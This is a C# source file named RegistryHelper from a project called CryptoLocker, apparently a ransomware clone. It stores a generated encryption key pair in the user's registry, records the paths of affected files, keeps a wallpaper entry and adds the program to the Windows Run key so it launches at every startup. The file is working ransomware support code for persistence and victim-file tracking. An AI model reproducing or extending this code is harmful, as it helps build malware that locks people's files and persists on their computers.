using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;

namespace CryptoLocker.Logic
{
    public class RegistryHelper
    {
        private const string AppName = "{222037BB-96DB-4BE4-A666-2253DCFCE805}";

        public static void EnsureKeysExists()
        {
            if (!string.IsNullOrEmpty(GetPrivateKey()))
            {
                return;
            }

            var kp = Cryptography.CreateKeyPair();

            RegistryKey softwareKey = Registry.CurrentUser.OpenSubKey("Software", true);
            softwareKey.CreateSubKey(AppName);

            RegistryKey cryptolockerRegKey = softwareKey.OpenSubKey(AppName, true);
            cryptolockerRegKey.CreateSubKey("AppVersion");
            cryptolockerRegKey.CreateSubKey("PrivateKey");
            cryptolockerRegKey.CreateSubKey("PublicKey");
            cryptolockerRegKey.CreateSubKey("Files");
            cryptolockerRegKey.CreateSubKey("Wallpaper");

            RegistryKey appVersionRegKey = cryptolockerRegKey.OpenSubKey("AppVersion", true);
            appVersionRegKey.SetValue("ver", "1.0.0");
            appVersionRegKey.SetValue("ip", "8.8.8.8");
            appVersionRegKey.SetValue("timestamp", DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:SS"));

            RegistryKey privateRegKey = cryptolockerRegKey.OpenSubKey("PrivateKey", true);
            privateRegKey?.SetValue("privatekey", kp.PublicAndPrivateKey);

            RegistryKey publicRegKey = cryptolockerRegKey.OpenSubKey("PublicKey", true);
            publicRegKey?.SetValue("publickey", kp.PublicKey);
        }

        public static string GetPrivateKey()
        {
            // Read
            var regKey = (string) Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\" + AppName + "\\PrivateKey", "privatekey", "");
            return regKey;
        }

        public static string GetPublicKey()
        {
            // Read
            var regKey = (string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\" + AppName + "\\PublicKey", "publickey", "");
            return regKey;
        }

        public static Dictionary<string,string> GetSubKeyFileNames()
        {
            RegistryKey filesKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\" + AppName + "\\Files" , true);

            if (filesKey != null)
            {
                var files = filesKey.GetValueNames();

                return files.ToDictionary(k => k.Replace("?","\\"), v => (string) filesKey.GetValue(v, ""));
            }
            return new Dictionary<string, string>();
        }

        public static void InsertFileName(string filePath, string fileName)
        {
            RegistryKey filesKey = Registry.CurrentUser.OpenSubKey("Software\\" + AppName + "\\Files", true);
            filesKey.SetValue(filePath.Replace("\\","?"), fileName);
        }

        public static void RemoveFile(string filePath)
        {
            RegistryKey filesKey = Registry.CurrentUser.OpenSubKey("Software\\" + AppName + "\\Files", true);
            filesKey.DeleteValue(filePath.Replace("\\", "?"), false);
        }

        // Use Application.ExecutablePath as param
        public static void AddToStartup(string executablePath)
        {
            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            // Add the value in the registry so that the application runs at startup
            rkApp.SetValue(AppName, /*Application.ExecutablePath*/ executablePath);
        }
    }
}